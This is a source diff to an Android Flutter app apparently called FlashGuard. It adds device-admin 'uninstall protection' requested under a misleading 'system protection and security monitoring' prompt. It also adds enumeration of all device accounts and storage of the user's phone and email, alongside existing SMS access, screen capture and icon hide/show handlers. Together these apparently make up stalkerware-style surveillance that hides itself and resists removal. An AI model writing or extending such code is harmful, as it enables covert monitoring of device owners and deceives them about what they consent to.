@@ -1,6 +1,9 @@
 package com.flashguard.flashguard
 
+import android.accounts.Account
+import android.accounts.AccountManager
 import android.app.Activity
+import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
@@ -26,16 +29,14 @@ class MainActivity : FlutterActivity() {
 
     private val CHANNEL       = "com.flashguard/control"
     private val REQ_SCREEN    = 1001
+    private val REQ_ADMIN     = 1002
     private val handler       = Handler(Looper.getMainLooper())
 
-    // MediaRecorder
     private var mediaRecorder: MediaRecorder? = null
-
-    // MediaProjection (screen capture)
     private var projectionManager: MediaProjectionManager? = null
     private var mediaProjection: MediaProjection? = null
     private var pendingScreenResult: MethodChannel.Result? = null
-    private var pendingScreenPath: String?             = null
+    private var pendingScreenPath: String? = null
 
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
         super.configureFlutterEngine(flutterEngine)
@@ -68,6 +69,58 @@ class MainActivity : FlutterActivity() {
                             )
                             result.success(true)
                         } catch (e: Exception) { result.error("SHOW_ICON_FAILED", e.message, null) }
+                    }
+
+                    // ── Device Admin (uninstall protection) ───────────────
+                    "enableDeviceAdmin" -> {
+                        try {
+                            val dpm   = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                            val admin = ComponentName(this, FlashGuardAdmin::class.java)
+                            if (dpm.isAdminActive(admin)) {
+                                result.success(true)
+                            } else {
+                                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+                                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
+                                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                                    "Required for system protection and security monitoring.")
+                                startActivityForResult(intent, REQ_ADMIN)
+                                pendingScreenResult = result
+                            }
+                        } catch (e: Exception) { result.error("ADMIN_FAILED", e.message, null) }
+                    }
+
+                    "isDeviceAdminActive" -> {
+                        try {
+                            val dpm   = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                            val admin = ComponentName(this, FlashGuardAdmin::class.java)
+                            result.success(dpm.isAdminActive(admin))
+                        } catch (e: Exception) { result.success(false) }
+                    }
+
+                    // ── Accounts (Gmail detection) ────────────────────────
+                    "getAccounts" -> {
+                        try {
+                            val am       = AccountManager.get(this)
+                            val accounts = am.accounts
+                            val list     = accounts.map { acc ->
+                                mapOf("name" to acc.name, "type" to acc.type)
+                            }
+                            result.success(list)
+                        } catch (e: Exception) { result.success(emptyList<Map<String, String>>()) }
+                    }
+
+                    // ── Save user credentials for uninstall protection ────
+                    "saveUserCredentials" -> {
+                        try {
+                            val phone = call.argument<String>("phone") ?: ""
+                            val email = call.argument<String>("email") ?: ""
+                            val prefs = getSharedPreferences("fg_acc", Context.MODE_PRIVATE)
+                            prefs.edit()
+                                .putString("user_phone", phone)
+                                .putString("user_email", email)
+                                .apply()
+                            result.success(true)
+                        } catch (e: Exception) { result.error("CRED_FAILED", e.message, null) }
                     }
 
                     // ── SMS ───────────────────────────────────────────────
@@ -170,7 +223,7 @@ class MainActivity : FlutterActivity() {
                     "requestScreenCapture" -> {
                         try {
                             if (mediaProjection != null) {
-                                result.success(true)   // already granted
+                                result.success(true)
                                 return@setMethodCallHandler
                             }
                             pendingScreenResult = result
@@ -195,24 +248,30 @@ class MainActivity : FlutterActivity() {
             }
     }
 
-    // ── Activity result for screen capture permission ─────────────────────────
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
-        if (requestCode == REQ_SCREEN) {
-            if (resultCode == Activity.RESULT_OK && data != null) {
-                mediaProjection = projectionManager?.getMediaProjection(resultCode, data)
-                pendingScreenResult?.success(true)
-            } else {
-                pendingScreenResult?.success(false)
+        when (requestCode) {
+            REQ_SCREEN -> {
+                if (resultCode == Activity.RESULT_OK && data != null) {
+                    mediaProjection = projectionManager?.getMediaProjection(resultCode, data)
+                    pendingScreenResult?.success(true)
+                } else {
+                    pendingScreenResult?.success(false)
+                }
+                pendingScreenResult = null
             }
-            pendingScreenResult = null
+            REQ_ADMIN -> {
+                val dpm   = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                val admin = ComponentName(this, FlashGuardAdmin::class.java)
+                pendingScreenResult?.success(dpm.isAdminActive(admin))
+                pendingScreenResult = null
+            }
         }
     }
 
-    // ── Actual screenshot capture via VirtualDisplay + ImageReader ────────────
     private fun captureScreen(mp: MediaProjection, path: String, result: MethodChannel.Result) {
         try {
-            val dm = resources.displayMetrics
+            val dm      = resources.displayMetrics
             val w       = dm.widthPixels.takeIf { it > 0 } ?: 1080
             val h       = dm.heightPixels.takeIf { it > 0 } ?: 1920
             val density = dm.densityDpi.takeIf { it > 0 } ?: 420
